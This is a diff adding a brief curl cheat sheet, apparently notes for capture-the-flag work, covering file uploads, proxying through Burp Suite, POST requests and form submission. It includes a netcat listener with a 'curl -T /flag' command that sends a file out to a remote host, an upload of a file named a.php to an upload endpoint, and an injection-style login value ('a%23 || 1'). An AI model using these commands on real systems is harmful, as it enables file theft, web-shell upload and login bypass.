@@ -1,0 +1,30 @@
+####################### $_FILE ################################
+curl -F 'file=@"tips";filename="a.php"' http://localhost/upload.php
+
+
+
+####################### curl, pass through burpsuite ########################
+
+curl -F 'file=@"tips";filename="a.php"' -x localhost:8080 http://localhost/upload.php
+
+
+####################### curl -T <file> <server> #############################
+
+local:
+nc -kl localhost 8888
+
+remote:
+curl -T /flag http://<local_ip>:8888
+
+
+####################### POST #################################################
+
+curl -X POST http://localhost:8888/ --data "username=a%23 || 1"
+
+## json
+
+curl -X POST -H "Content-Type: application/json" --data '{"key1":"val1", "key2":"val2"}'   http://localhost:8888
+
+## 模擬 Form 表單
+curl -X POST http://localhost/login -F "username=guest" -F "password=guest"
+
